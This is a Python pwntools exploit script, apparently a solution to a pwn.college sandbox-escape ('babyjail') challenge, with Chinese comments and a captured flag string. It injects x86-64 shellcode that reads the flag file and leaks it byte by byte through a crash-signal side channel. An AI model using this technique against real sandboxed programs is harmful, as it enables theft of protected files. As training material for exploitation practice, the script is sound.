from pwn import *
import os
import time

# 用退出的方式判断, 用二分法来一点点计算
# 用的ja 小于跳转=。=, 感觉好像都不太对的样子, 总之这样写能跑就是了
# pwn_college{0P4IKvZcOA8TDUaEwtXpQImWRht.dJTNxwiMxkzW}
context(os='linux', arch='amd64',)#log_level='debug')

def getshellcode(num, value):
    shellcode = b""
    shellcode += asm("xor rax, rax")
    shellcode += asm("xor rdi, rdi")
    shellcode += asm("xor rsi, rsi")
    shellcode += asm("xor rdx, rdx")
    shellcode += asm("mov rax, 0")
    shellcode += asm("mov rdi, 3")
    shellcode += asm("lea rsi, [rip+0x30]")
    shellcode += asm("mov rdx, {}".format(100))
    shellcode += asm("syscall")
    shellcode += asm("mov rax, 35")
    shellcode += asm("mov edi, dword ptr [rsi+{}]".format(num))
    shellcode += asm("push 0")
    shellcode += asm("and rdi, 0x000000ff")
    shellcode += asm("cmp rdi, {}".format(value))
    #shellcode += asm("ja [rip+0x3]")    # 因为num会占用一个位, 所以增加1格
    shellcode += b'\x77\x01'            # 因为那啥ja偏移很难写, 就直接写这样啦
    shellcode += asm("int 3")
    shellcode += asm("lea rsi, [0x1360000]")
    shellcode += asm("mov rdi, 3")
    shellcode += asm("syscall")
    return shellcode

if __name__ == '__main__':
    string = 'p'
    # 要用二分法, 但是那个写起来有点麻烦地说
    # 存在一些异常情况, 会有-6返回值
    # -5 int 3 , -11 read() err
    for i in range(1,53):
        for j in range(0x7e, 0x20, -1):
            try:
                io = process(["./babyjail_level12_testing1", "/flag"])
                io.recvuntil(b"stdin\n")
            except EOFError:
                continue
            io.sendline(getshellcode(i, j))
            io.recvall()
            ret = io.poll()
            io.close()
            if ret == -11:
                string += chr(j+1)
                break
        #print(io.poll())
    print(string)
